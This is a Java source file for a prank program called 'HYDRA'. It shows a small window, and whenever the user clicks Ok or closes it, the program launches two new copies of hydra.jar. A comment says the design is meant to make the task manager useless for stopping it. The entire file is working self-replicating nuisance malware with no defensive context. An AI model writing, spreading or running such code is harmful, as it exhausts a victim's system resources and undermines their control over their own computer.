import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.border.CompoundBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Random;

public class Main {

    public static void main(String[] args) {
        createAndShowGUI();
    }

    private static void createAndShowGUI() {

        JFrame frame = new JFrame("HYDRA");
        ImageIcon icon = new ImageIcon("/resources/hydra.png");
        frame.setIconImage(icon.getImage());
        frame.setSize(350, 120);
        JLabel label = new JLabel("<html>Cut off a head, two more will take its place.<br/><html/>");
        JButton button = new JButton("Ok");

        JPanel leftPanel = new JPanel(); leftPanel.setLayout(new FlowLayout());
        JPanel rightPanel = new JPanel(); rightPanel.setLayout(new GridLayout(2,1));
        JPanel rightSubPanel1 = new JPanel(); rightSubPanel1.setLayout(new FlowLayout());
        JPanel rightSubPanel2 = new JPanel(); //rightSubPanel2.setLayout(new FlowLayout());

        // Set layout manager to BorderLayout
        frame.setLayout(new BorderLayout());

        // Add label to the frame at the top
        frame.add(label, BorderLayout.NORTH);
        rightSubPanel1.add(label);
        rightSubPanel2.add(button, BorderLayout.EAST);
        leftPanel.add(new JLabel(new ImageIcon("/resources/hydra.png")), (BorderLayout.WEST));


// ====================================================================
        rightPanel.add(rightSubPanel1);
        rightPanel.add(rightSubPanel2);
        frame.add(leftPanel, BorderLayout.WEST);
        frame.add(rightPanel, BorderLayout.EAST);

        Random rand = new Random();
        int x = rand.nextInt(800);
        int y = rand.nextInt(600);
        frame.setLocation(x, y);
        frame.setVisible(true);
        frame.setResizable(false);
        CompoundBorder cb = new CompoundBorder(BorderFactory.createEmptyBorder(5,5,5,5), BorderFactory.createLineBorder(Color.BLACK));
        rightSubPanel1.setBorder(cb);

        button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {Hydra(); Hydra(); frame.dispose();}
        });

        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {Hydra();Hydra();
            }
        });


    }

    // So this is the part that `recursively` runs hydra.jar file, effectively rendering task manager useless to end the task
    private static void Hydra(){
        try {
            String jarFilePath = "hydra.jar";
            String javaCommand = "java";
            String jarCommand = "-jar";
            ProcessBuilder processBuilder = new ProcessBuilder(javaCommand, jarCommand, jarFilePath);
            Process process = processBuilder.start();


        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    // Trying to figure out how to make the image work in the outputted jar
    /*private static BufferedImage loadImage(String path) {
        try (InputStream inputStream = createAndShowGUI().class.getResourceAsStream(path)) {
            return ImageIO.read(inputStream);
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }*/

}
